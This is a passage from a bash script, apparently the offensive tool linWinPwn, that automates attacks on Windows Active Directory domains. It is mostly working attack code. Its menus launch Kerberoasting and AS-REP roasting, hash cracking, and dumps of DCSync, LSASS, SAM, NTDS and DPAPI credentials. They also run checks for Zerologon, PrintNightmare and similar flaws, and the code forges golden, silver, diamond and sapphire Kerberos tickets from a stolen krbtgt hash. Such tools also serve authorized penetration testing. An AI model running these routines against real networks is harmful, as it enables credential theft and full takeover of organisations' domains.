        krbtgt_aes=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep aes256 | cut -d ":" -f 3)
    fi
    echo -e ""
}

ad_enum () {
    bhd_enum
    ldapdomaindump_enum
    enum4linux_enum
    ne_smb_enum
    ne_ldap_enum
    deleg_enum_imp
    certi_py_enum
    certipy_enum
    silenthound_enum
    windapsearch_enum
    ldeep_enum
    ridbrute_attack
    userpass_ne_check
    pre2k_check
    bloodyad_enum
}

kerberos () {
    kerbrute_enum
    userpass_kerbrute_check
    asrep_attack
    asreprc4_attack
    kerberoast_attack
    john_crack_asrep
    john_crack_kerberoast
}

scan_shares () {
    smb_map
    ne_shares
    manspider_scan
}

pwd_dump () {
    juicycreds_dump
    laps_dump
    gmsa_dump
    secrets_dump
    lsassy_dump
    dpapi_dump
}

vuln_checks () {
    nopac_check
    petitpotam_check
    zerologon_check
    ms14-068_check
    ms17-010_check
    spooler_check
    printnightmare_check
    webdav_check
    dfscoerce_check
    shadowcoerce_check
    smbsigning_check
    ntlmv1_check
    runasppl_check
    rpcdump_check
    coercer_check
    certifried_check
}

print_info () {
    echo -e "${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}"
    echo -e "${YELLOW}[i]${NC} Running modules: ${YELLOW}${modules}${NC}"
    echo -e "${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}"
    echo -e "${YELLOW}[i]${NC} User wordlist file: ${YELLOW}${user_wordlist}${NC}"
    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${YELLOW}${pass_wordlist}${NC}"
    echo -e "${YELLOW}[i]${NC} Attacker's IP: ${YELLOW}${attacker_IP}${NC}"
    echo -e "${YELLOW}[i]${NC} Attacker's Interface: ${YELLOW}${attacker_interface}${NC}"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW}${curr_targets} ${custom_servers}${custom_ip}${NC}"
}

modify_target () {
    echo -e ""
    echo -e "${YELLOW}[Modify target(s)]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "1) Domain Controllers"
    echo -e "2) All domain servers"
    echo -e "3) File containing list of servers"
    echo -e "4) IP or hostname"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        1)
        curr_targets="Domain Controllers"
        custom_servers=""
        custom_ip=""
        ;;

        2)
        curr_targets="All domain servers"
        custom_servers=""
        custom_ip=""
        ;;

        3)
        curr_targets="File containing list of servers"
        custom_servers=""
        custom_ip=""
        custom_target_scanned=false
        /bin/rm ${custom_servers_list} 2>/dev/null
        read -p ">> " custom_servers </dev/tty
        /bin/cp $custom_servers ${custom_servers_list} 2>/dev/null
        while [ ! -s "${custom_servers_list}" ] ; do
            echo -e "${RED}Invalid servers list.${NC} Please specify file containing list of target servers:"
            read -p ">> " custom_servers </dev/tty
            /bin/cp $custom_servers ${custom_servers_list} 2>/dev/null
        done
        ;;

        4)
        curr_targets="IP or hostname"
        custom_servers=""
        custom_ip=""
        custom_target_scanned=false
        /bin/rm ${custom_servers_list} 2>/dev/null
        read -p ">> " custom_ip </dev/tty
        echo -n $custom_ip > ${custom_servers_list} 2>/dev/null
        while [ ! -s "${custom_servers_list}" ] ; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -p ">> " custom_ip </dev/tty
            echo -n $custom_ip > ${custom_servers_list} 2>/dev/null
        done
        ;;

        99)
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        modify_target
        ;;
    esac
}

set_attackerIP(){
    echo -e "Please choose your IP from the following options:"
    attacker_IPlist=$(/usr/bin/hostname --all-ip-addresses)
    echo -e "${YELLOW}[i]${NC} Attacker's list of IPs: $attacker_IPlist${NC}"
    attacker_IP=""
    read -p ">> " attacker_IP </dev/tty
    while [ "$attacker_IP" == *"$attacker_IPlist"* ] && [ ! "${attacker_IP}" == "" ]; do
        echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list:"
        echo -e "${YELLOW}[i]${NC} Attacker IPs: $attacker_IPlist${NC}"
        read -p ">> " attacker_IP </dev/tty
    done
}

ad_menu () {
    echo -e ""
    echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------"
    echo -e "A) ALL ACTIVE DIRECTORY ENUMERATIONS"
    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
    echo -e "2) BloodHound Enumeration using DCOnly"
    echo -e "3) ldapdomaindump LDAP Enumeration"
    echo -e "4) enum4linux-ng LDAP-MS-RPC Enumeration"
    echo -e "5) MS-RPC Enumeration using netexec (Users, pass pol, GPP)"
    echo -e "6) LDAP Enumeration using netexec (Users, passnotreq, ADCS, userdesc, maq, ldap-checker, deleg, subnets)"
    echo -e "7) Delegation Enumeration using findDelegation"
    echo -e "8) certi.py ADCS Enumeration"
    echo -e "9) Certipy ADCS Enumeration"
    echo -e "10) SilentHound LDAP Enumeration"
    echo -e "11) windapsearch LDAP Enumeration"
    echo -e "12) ldeep LDAP Enumeration"
    echo -e "13) RID Brute Force (Null session) using netexec"
    echo -e "14) User=Pass check using netexec (Noisy!)"
    echo -e "15) Pre2k computers authentication check (Noisy!)"
    echo -e "16) bloodyAD Enumeration"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        ad_enum
        ad_menu
        ;;

        1)
        bhd_enum
        ad_menu
        ;;

        2)
        bhd_enum_dconly
        ad_menu
        ;;

        3)
        ldapdomaindump_enum
        ad_menu
        ;;

        4)
        enum4linux_enum
        ad_menu
        ;;

        5)
        ne_smb_enum
        ad_menu;;

        6)
        ne_ldap_enum
        ad_menu;;

        7)
        deleg_enum_imp
        ad_menu;;

        8)
        certi_py_enum
        ad_menu;;

        9)
        certipy_enum
        ad_menu;;

        10)
        silenthound_enum
        ad_menu
        ;;

        11)
        windapsearch_enum
        ad_menu
        ;;

        12)
        ldeep_enum
        ad_menu
        ;;
        
        13)
        ridbrute_attack
        ad_menu;;

        14)
        userpass_ne_check
        ad_menu;;

        15)
        pre2k_check
        ad_menu;;

        16)
        bloodyad_enum
        ad_menu;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        ad_menu
        ;;
    esac
}

kerberos_menu () {
    echo -e ""
    echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------------"
    echo -e "A) ALL KERBEROS ATTACKS"
    echo -e "1) User Enumeration using kerbrute (Null session)"
    echo -e "2) User=Pass check using kerbrute (Noisy!)"
    echo -e "3) AS REP Roasting Attack using GetNPUsers"
    echo -e "4) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
    echo -e "5) Kerberoast Attack using GetUserSPNs"
    echo -e "6) Targeted Kerberoast Attack (Noisy!)"
    echo -e "7) Cracking AS REP Roast hashes using john the ripper"
    echo -e "8) Cracking Kerberoast hashes using john the ripper"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        kerberos
        kerberos_menu
        ;;

        1)
        kerbrute_enum
        kerberos_menu
        ;;

        2)
        userpass_kerbrute_check
        kerberos_menu
        ;;

        3)
        asrep_attack
        kerberos_menu
        ;;

        4)
        asreprc4_attack
        kerberos_menu
        ;;

        5)
        kerberoast_attack
        kerberos_menu
        ;;

        6)
        targetedkerberoast_attack
        kerberos_menu
        ;;

        7)
        john_crack_asrep
        kerberos_menu
        ;;
        
        8)
        john_crack_kerberoast
        kerberos_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        kerberos_menu
        ;;
    esac
}

shares_menu () {
    echo -e ""
    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) ALL SMB SHARES SCANS"
    echo -e "m) Modify target(s)"
    echo -e "1) SMB shares Scan using smbmap"
    echo -e "2) SMB shares Enumeration using netexec"
    echo -e "3) SMB shares Spidering using netexec "
    echo -e "4) SMB shares Scan using FindUncommonShares"
    echo -e "5) SMB shares Scan using manspider"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        scan_shares
        shares_menu
        ;;

        m)
        modify_target
        shares_menu
        ;;

        1)
        smb_map
        shares_menu
        ;;

        2)
        ne_shares
        shares_menu
        ;;

        3)
        ne_spider
        shares_menu
        ;;

        4)
        finduncshar_scan
        shares_menu
        ;;

        5)
        manspider_scan
        shares_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        shares_menu
        ;;
    esac
 
}

vulns_menu () {
    echo -e ""
    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) ALL VULNERABILITY CHECKS"
    echo -e "m) Modify target(s)"
    echo -e "1) NoPac check using netexec (only on DC)"
    echo -e "2) PetitPotam check using netexec (only on DC)"
    echo -e "3) dfscoerce check using netexec (only on DC)"
    echo -e "4) zerologon check using netexec (only on DC)"
    echo -e "5) MS14-068 check (only on DC)"
    echo -e "6) MS17-010 check using netexec"
    echo -e "7) Print Spooler check using netexec"
    echo -e "8) Printnightmare check using netexec"
    echo -e "9) WebDAV check using netexec"
    echo -e "10) shadowcoerce check using netexec"
    echo -e "11) SMB signing check using netexec"
    echo -e "12) ntlmv1 check using netexec"
    echo -e "13) runasppl check using netexec"
    echo -e "14) RPC Dump and check for interesting protocols"
    echo -e "15) Coercer RPC scan"
    echo -e "16) Certifried check"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        vuln_checks
        vulns_menu
        ;;

        m)
        modify_target
        vulns_menu
        ;;
        
        1)
        nopac_check
        vulns_menu
        ;;

        2)
        petitpotam_check
        vulns_menu
        ;;

        3)
        dfscoerce_check
        vulns_menu
        ;;

        4)
        zerologon_check
        vulns_menu
        ;;

        5)
        ms14-068_check
        vulns_menu
        ;;
        
        6)
        ms17-010_check
        vulns_menu
        ;;

        7)
        spooler_check
        vulns_menu
        ;;
        
        8)
        printnightmare_check
        vulns_menu
        ;;

        9)
        webdav_check
        vulns_menu
        ;;

        10)
        shadowcoerce_check
        vulns_menu
        ;;

        11)
        smbsigning_check
        vulns_menu
        ;;

        12)
        ntlmv1_check
        vulns_menu
        ;;

        13)
        runasppl_check
        vulns_menu
        ;;

        14)
        rpcdump_check
        vulns_menu
        ;;

        15)
        coercer_check
        vulns_menu
        ;;

        16)
        certifried_check
        vulns_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        vulns_menu
        ;;
    esac
}

pwd_menu () {
    echo -e ""
    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "A) ALL PASSWORD DUMPS"
    echo -e "m) Modify target(s)"
    echo -e "1) LAPS Dump using netexec"
    echo -e "2) gMSA Dump using netexec"
    echo -e "3) DCSync using secretsdump (only on DC)"
    echo -e "4) Dump SAM and LSA using secretsdump"
    echo -e "5) Dump SAM and SYSTEM using reg"
    echo -e "6) Dump NTDS using netexec"
    echo -e "7) Dump SAM using netexec"
    echo -e "8) Dump LSA secrets using netexec"
    echo -e "9) Dump LSASS using lsassy"
    echo -e "10) Dump LSASS using handlekatz"
    echo -e "11) Dump LSASS using procdump"
    echo -e "12) Dump LSASS using nanodump"
    echo -e "13) Dump LSASS using masky (ADCS required)"
    echo -e "14) Dump dpapi secrets using netexec"
    echo -e "15) Dump secrets using DonPAPI"
    echo -e "16) Dump NTDS using certsync (ADCS required) (only on DC)"
    echo -e "17) Dump secrets using hekatomb (only on DC)"
    echo -e "18) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
    echo -e "19) Dump Veeam credentials (only from Veeam server)"
    echo -e "20) Dump Msol password (only from Azure AD-Connect server)"
    echo -e "99) Back"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        A)
        pwd_dump
        pwd_menu
        ;;

        m)
        modify_target
        pwd_menu
        ;;

        1)
        laps_dump
        pwd_menu
        ;;

        2)
        gmsa_dump
        pwd_menu
        ;;

        3)
        secrets_dump_dcsync
        pwd_menu
        ;;

        4)
        secrets_dump
        pwd_menu
        ;;

        5)
        samsystem_dump
        pwd_menu
        ;;

        6)
        ntds_dump
        pwd_menu
        ;;

        7)
        sam_dump
        pwd_menu
        ;;

        8)
        lsa_dump
        pwd_menu
        ;;

        9)
        lsassy_dump
        pwd_menu
        ;;

        10)
        handlekatz_dump
        pwd_menu
        ;;

        11)
        procdump_dump
        pwd_menu
        ;;

        12)
        nanodump_dump
        pwd_menu
        ;;

        13)
        masky_dump
        pwd_menu
        ;;

        14)
        dpapi_dump
        pwd_menu
        ;;

        15)
        donpapi_dump
        pwd_menu
        ;;

        16)
        certsync_ntds_dump
        pwd_menu
        ;;

        17)
        hekatomb_dump
        pwd_menu
        ;;

        18)
        juicycreds_dump
        pwd_menu
        ;;

        19)
        veeam_dump
        pwd_menu
        ;;

        20)
        msol_dump
        pwd_menu
        ;;

        99)
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        pwd_menu
        ;;
    esac
}

init_menu () {
    echo -e ""
    echo -e "${YELLOW}[Init menu]${NC} Please choose from the following options:"
    echo -e "----------------------------------------------------"
    echo -e "ENTER) Launch linWinPwn in interactive mode"
    echo -e "A) Authentication Menu"
    echo -e "C) Configuration Menu"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        C)
        config_menu
        ;;

        A)
        auth_menu
        ;;  

        "")
        dns_enum
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        init_menu
        ;;
    esac
}

auth_menu () {
    echo -e ""
    echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
    echo -e "----------------------------------------------------"
    echo -e "ENTER) Go back to Init Menu"
    echo -e "1) Generate and use NTLM hash of current user (requires: password) - Pass the hash"
    echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
    echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
    echo -e "4) Force use Kerberos authentication with netexec (requires: password, NTLM hash or AES key)"
    echo -e "5) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
    echo -e "6) Request certificate using Certipy (requires: authenticated)"
    echo -e "7) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin)"
    echo -e "8) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
    echo -e "9) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
    echo -e "10) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        C)
        config_menu
        ;;

        A)
        auth_menu
        ;;  

        1)
        if [ "${pass_bool}" == true ] ; then
            hash=":$(iconv -f ASCII -t UTF-16LE <(printf ${password}) | $(which openssl) dgst -md4 | cut -d " " -f 2)"
            echo -e "${GREEN}[+] NTLM hash generated:${NC} $hash"
            pass_bool=false
            hash_bool=true
            authenticate
        else
            echo -e "${RED}[-] Error! Requires password...${NC}"
        fi
        auth_menu
        ;;

        2)
        if [ ! -f "${john}" ] ; then
            echo -e "${RED}[-] Please verify the installation of john${NC}"
        else
            if [ "${hash_bool}" == true ] ; then
                echo $hash | cut -d ":" -f 2 > ${output_dir}/Credentials/ntlm_hash
                echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
                run_command "$john ${output_dir}/Credentials/ntlm_hash --format=NT --wordlist=$pass_wordlist" | tee "${output_dir}/Credentials/johnNTLM_output_${dc_domain}"
                john_out=$($john ${output_dir}/Credentials/ntlm_hash --format=NT --show)
                if [[ "${john_out}" == *"1 password"* ]]; then
                    pass_bool=true
                    hash_bool=false
                    password=$(echo $john_out | cut -d ":" -f 2 | cut -d " " -f 1)
                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password"
                    authenticate
                else
                    echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires NTLM hash...${NC}"
            fi
        fi
        auth_menu
        ;;

        3)
        if [ ! -f "${impacket_getTGT}" ]; then
            echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
                run_command "${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
                cd ${current_dir}
                if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
                    krb5cc="${output_dir}/Credentials/${user}.ccache"
                    pass_bool=false
                    hash_bool=false
                    aeskey_bool=false
                    kerb_bool=true
                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb5cc"
                    authenticate
                else
                    echo -e "${RED}[-] Failed to generate TGT${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
            fi
        fi
        auth_menu
        ;;

        4)
        if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
            forcekerb_bool=true
            echo -e "${YELLOW}[i] Using kerberos authentication with netexec...${NC}"
        else
            echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
        fi
        auth_menu
        ;;

        5)
        if [[ ! -f "${certipy}" ]] ; then
            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
        else
            if [[ ${pfxcert_bool} == false ]]; then
                echo -e "Please specify location of certificate file:"
                read -p ">> " pfxcert </dev/tty
                while [ ! -s "${pfxcert}" ] ; do
                    echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
                    read -p ">> " pfxcert </dev/tty
                done
                echo -e "Please specify password of certificate file (press Enter if no password):"
                read -p ">> " pfx_pass </dev/tty
            fi
            echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            if [[ ${pfx_pass} == "" ]]; then
                run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
            else
                run_command "${certipy} cert -export -pfx $(realpath $pfxcert) -password $pfx_pass -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
                run_command "${certipy} auth -pfx ${user}_unprotected.pfx -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
            fi
            hash=$(/bin/cat "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" 2>/dev/null | grep "Got hash for" | cut -d " " -f 6)
            echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
            pass_bool=false
            hash_bool=true
            aeskey_bool=false
            kerb_bool=false
            authenticate
            cd ${current_dir}
        fi
        echo -e ""
        auth_menu
        ;;

        6)
        if [[ ! -f "${certipy}" ]] ; then
            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
        else
            ne_adcs_enum
            current_dir=$(pwd)
            cd ${output_dir}/Credentials
            i=0
            for pki_server in $pki_servers; do
                i=$((i + 1))
                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
            done
            cd ${current_dir}
            if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
                echo -e "${GREEN}[+] Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
            else
                echo -e "${RED}[-] Failed to request certificate${NC}"
            fi
        fi
        auth_menu
        ;;
        
        7)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                echo -e "Please specify '1' for NTLM and '2' for AES:"
                read -p ">> " ntlm_or_aes </dev/tty
                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                    read -p ">> " ntlm_or_aes </dev/tty
                done
                get_hash_krbtgt
                if [[ ${ntlm_or_aes} -eq 1 ]]; then krbtgt_key="-nthash ${krbtgt_nt}"; else krbtgt_key="-aesKey ${krbtgt_aes}"; fi

                tick_randuser="sql_svc"
                tick_user_id=""
                tick_groups=""
                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
                read -p ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "Please specify custom user id (press Enter to skip):"
                read -p ">> " tick_user_id_value </dev/tty
                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
                echo -e "Please specify comma separated custom groups ids (e.g. '512,513,518,519,520') (press Enter to skip):"
                read -p ">> " tick_group_ids_value </dev/tty
                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi

                echo -e "${CYAN}[*] Generating golden ticket...${NC}"
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                run_command "${impacket_ticketer} ${krbtgt_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
                cd ${current_dir}
                if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
                    echo -e "${GREEN}[+] Golden ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_golden.ccache"
                else
                    echo -e "${RED}[-] Failed to generate golden ticket${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        auth_menu
        ;;

        8)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                echo -e "Please specify '1' for NTLM and '2' for AES:"
                read -p ">> " ntlm_or_aes </dev/tty
                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                    read -p ">> " ntlm_or_aes </dev/tty
                done
                get_hash_krbtgt
                if [[ ${ntlm_or_aes} -eq 1 ]]; then krbtgt_key="-nthash ${krbtgt_nt}"; else krbtgt_key="-aesKey ${krbtgt_aes}"; fi

                tick_randuser="sql_svc"
                tick_spn="CIFS/${dc_domain}"
                tick_groups=""
                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
                read -p ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
                read -p ">> " tick_spn_value </dev/tty
                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi

                echo -e "${CYAN}[*] Generating silver ticket for service $spn...${NC}"
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                run_command "${impacket_ticketer} ${krbtgt_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuser}"
                ticket_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').ccache"
                /bin/mv "./${tick_randuser}.ccache" "./${ticket_out}" 2>/dev/null
                cd ${current_dir}
                if [ -f "${output_dir}/Credentials/${ticket_out}" ]; then
                    echo -e "${GREEN}[+] silver ticket generated successfully:${NC} ${output_dir}/Credentials/${ticket_out}"
                else
                    echo -e "${RED}[-] Failed to generate silver ticket${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        auth_menu
        ;;
        
        9)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                get_hash_krbtgt
                krbtgt_key="-nthash ${krbtgt_nt} -aesKey ${krbtgt_aes}"
                tick_randuser="sql_svc"
                tick_user_id="1337"
                tick_groups="512,513,518,519,520"
                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
                read -p ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
                read -p ">> " tick_user_id_value </dev/tty
                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
                echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
                read -p ">> " tick_group_ids_value </dev/tty
                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi

                echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${krbtgt_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
                cd ${current_dir}
                if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
                    echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
                else
                    echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        auth_menu
        ;;
        
        10)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                get_hash_krbtgt
                krbtgt_key="-nthash ${krbtgt_nt} -aesKey ${krbtgt_aes}"
                tick_randuser="sql_svc"
                tick_user_id="1337"
                tick_groups="512,513,518,519,520"
                tick_domain_admin="${user}"
                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
                read -p ">> " tick_randuser_value </dev/tty
                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
                read -p ">> " tick_user_id_value </dev/tty
                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
                echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
                read -p ">> " tick_group_ids_value </dev/tty
                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
                echo -e "Please specify domain admin to impersonate (press Enter to choose default value current user):"
                read -p ">> " tick_domain_admin_value </dev/tty
                if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi

                echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${krbtgt_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
                cd ${current_dir}
                if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
                    echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
                else
                    echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
            fi
        fi
        auth_menu
        ;;

        "")
        init_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        auth_menu
        ;;
    esac
}

config_menu () {
    echo -e ""
